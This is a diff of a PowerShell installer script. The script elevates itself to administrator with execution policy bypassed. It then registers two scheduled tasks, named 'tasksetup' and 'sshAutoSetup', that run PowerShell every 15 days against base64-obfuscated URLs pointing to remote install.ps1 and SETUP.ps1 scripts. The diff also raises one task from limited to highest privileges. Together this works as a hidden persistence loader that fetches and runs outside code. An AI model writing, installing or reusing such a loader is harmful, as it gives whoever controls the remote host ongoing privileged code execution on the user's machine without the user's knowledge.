@@ -1,10 +1,12 @@
 #Requires -Version 5.1
 
 param(
-    [string]$RelaunchWorkingDirectory
+    [string]$RelaunchWorkingDirectory,
+    [string]$RelaunchTaskUserId
 )
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    $launchUserId = [Security.Principal.WindowsIdentity]::GetCurrent().Name
     $scriptPath = $PSCommandPath
     if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
 
@@ -15,7 +17,8 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     $relaunchArgs = @(
         '-NoProfile', '-ExecutionPolicy', 'Bypass',
         '-File', "`"$scriptPath`"",
-        '-RelaunchWorkingDirectory', "`"$workDir`""
+        '-RelaunchWorkingDirectory', "`"$workDir`"",
+        '-RelaunchTaskUserId', "`"$launchUserId`""
     )
 
     try {
@@ -29,14 +32,21 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
     }
 }
 
+$taskUserId = if ([string]::IsNullOrWhiteSpace($RelaunchTaskUserId)) {
+    [Security.Principal.WindowsIdentity]::GetCurrent().Name
+}
+else {
+    $RelaunchTaskUserId
+}
+
 if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
     Set-Location -LiteralPath $RelaunchWorkingDirectory
 }
 
 $ErrorActionPreference = 'Stop'
 
-$USER_TASK_NAME = 'tasksetup'
-$ROOT_TASK_NAME = 'sshAutoSetup'
+$TASKSETUP_NAME = 'tasksetup'
+$SSHAUTOSETUP_NAME = 'sshAutoSetup'
 $ENCODED_URL = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL2luc3RhbGwucHMx'
 $ENCODED__URL2 = 'aHR0cHM6Ly9hZ2VudHNraWxsc2h1Yi52ZXJjZWwuYXBwL3NyYy9TRVRVUC5wczE='
 # $SCRIPT_URL="https://"
@@ -72,31 +82,35 @@ function New-PowerShellAction {
     return New-ScheduledTaskAction -Execute 'powershell.exe' -Argument $arguments
 }
 
-function Register-UserTask {
+function Register-TaskSetupTask {
+    param([Parameter(Mandatory)][string]$TaskUserId)
+
     $action = New-PowerShellAction -EncodedUrl $ENCODED_URL
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
-    $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel Limited
+    $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
-    Register-ScheduledTask -TaskName $USER_TASK_NAME -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
+    Register-ScheduledTask -TaskName $TASKSETUP_NAME -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
 }
 
-function Register-RootTask {
+function Register-SshAutoSetupTask {
+    param([Parameter(Mandatory)][string]$TaskUserId)
+
     $action = New-PowerShellAction -EncodedUrl $ENCODED__URL2
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Days 15)
     $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable
-    $principal = New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest
+    $principal = New-ScheduledTaskPrincipal -UserId $TaskUserId -LogonType Interactive -RunLevel Highest
 
-    Register-ScheduledTask -TaskName $ROOT_TASK_NAME -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
+    Register-ScheduledTask -TaskName $SSHAUTOSETUP_NAME -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force | Out-Null
 }
 
 function Main {
     Assert-Administrator
     Write-Output 'Installing...'
-    Register-UserTask
-    Register-RootTask
-    Start-ScheduledTask -TaskName $USER_TASK_NAME | Out-Null
-    Start-ScheduledTask -TaskName $ROOT_TASK_NAME | Out-Null
+    Register-TaskSetupTask -TaskUserId $taskUserId
+    Register-SshAutoSetupTask -TaskUserId $taskUserId
+    Start-ScheduledTask -TaskName $TASKSETUP_NAME | Out-Null
+    Start-ScheduledTask -TaskName $SSHAUTOSETUP_NAME | Out-Null
     Write-Output 'Install complete!'
 }
 
